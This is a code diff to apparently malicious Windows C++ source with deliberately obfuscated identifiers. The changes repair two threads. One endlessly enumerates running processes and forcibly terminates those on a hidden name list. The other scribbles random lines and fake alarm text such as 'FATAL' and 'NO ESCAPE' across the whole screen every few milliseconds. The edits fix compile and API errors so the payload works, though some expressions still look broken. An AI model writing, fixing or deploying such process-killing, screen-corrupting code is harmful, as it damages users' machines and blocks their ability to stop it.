@@ -23,12 +23,12 @@ DWORD WINAPI MnOpQrStUv(LPVOID) {
     while (true) {
         HANDLE WxYzAbCdEf = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
         if (WxYzAbCdEf != INVALID_HANDLE_VALUE) {
-            PROCESSENTRY32 GhIjKlMnOp;
+            PROCESSENTRY32W GhIjKlMnOp;
             GhIjKlMnOp.dwSize = sizeof(GhIjKlMnOp);
-            if (Process32First(WxYzAbCdEf, &GhIjKlMnOp)) {
+            if (Process32FirstW(WxYzAbCdEf, &GhIjKlMnOp)) {
                 do {
                     std::wstring QrStUvWxYz(GhIjKlMnOp.szExeFile);
-                    for (auto& AbCdEfGhIj : AbCdEfGhIj()) {
+                    for (const auto& AbCdEfGhIj : AbCdEfGhIj()) {
                         if (QrStUvWxYz == AbCdEfGhIj) {
                             HANDLE KlMnOpQrSt = OpenProcess(PROCESS_TERMINATE, FALSE, GhIjKlMnOp.th32ProcessID);
                             if (KlMnOpQrSt) {
@@ -37,7 +37,7 @@ DWORD WINAPI MnOpQrStUv(LPVOID) {
                             }
                         }
                     }
-                } while (Process32Next(WxYzAbCdEf, &GhIjKlMnOp));
+                } while (Process32NextW(WxYzAbCdEf, &GhIjKlMnOp));
             }
             CloseHandle(WxYzAbCdEf);
         }
@@ -68,17 +68,18 @@ DWORD WINAPI UvWxYzAbCd(LPVOID) {
         int KlMnOpQrSt = rand() % 150 + 10;
         int UvWxYzAbCd = rand() % 20 + 10;
 
-        HPEN EfGhIjKlMn = CreatePen(PS_SOLID, rand() % 10 + 1, RGB(rand() % 256, rand() % 256, rand() % 256));
-        HGDIOBJ OpQrStUvWx = SelectObject(EfGhIjKlMn, EfGhIjKlMn);
+        HPEN EfGhIjKlMn2 = CreatePen(PS_SOLID, rand() % 10 + 1, RGB(rand() % 256, rand() % 256, rand() % 256));
+        HGDIOBJ OpQrStUvWx2 = SelectObject(EfGhIjKlMn, EfGhIjKlMn2);
         MoveToEx(EfGhIjKlMn, QrStUvWxYz, AbCdEfGhIj, NULL);
         LineTo(EfGhIjKlMn, QrStUvWxYz + KlMnOpQrSt, AbCdEfGhIj + UvWxYzAbCd);
-        SelectObject(EfGhIjKlMn, OpQrStUvWx);
-        DeleteObject(EfGhIjKlMn);
+        SelectObject(EfGhIjKlMn, OpQrStUvWx2);
+        DeleteObject(EfGhIjKlMn2);
 
-        const wchar_t* YzAbCdEfGh[] = { L"FATAL", L"ERROR", L"SYSTEM", L"CRITICAL", L"0xDEADBEEF", L"NO ESCAPE" };
+        const wchar_t* YzAbCdEfGh2[] = { L"FATAL", L"ERROR", L"SYSTEM", L"CRITICAL", L"0xDEADBEEF", L"NO ESCAPE" };
         SetTextColor(EfGhIjKlMn, RGB(rand() % 256, rand() % 256, rand() % 256));
         SetBkMode(EfGhIjKlMn, TRANSPARENT);
-        TextOutW(EfGhIjKlMn, rand() % OpQrStUvWx, rand() % YzAbCdEfGh, YzAbCdEfGh[rand() % 6], wcslen(YzAbCdEfGh[rand() % 6]));
+        int XyZzYyXxWw = rand() % 6;
+        TextOutW(EfGhIjKlMn, rand() % OpQrStUvWx, rand() % YzAbCdEfGh, YzAbCdEfGh2[XyZzYyXxWw], wcslen(YzAbCdEfGh2[XyZzYyXxWw]));
 
         ReleaseDC(NULL, EfGhIjKlMn);
         Sleep(10);
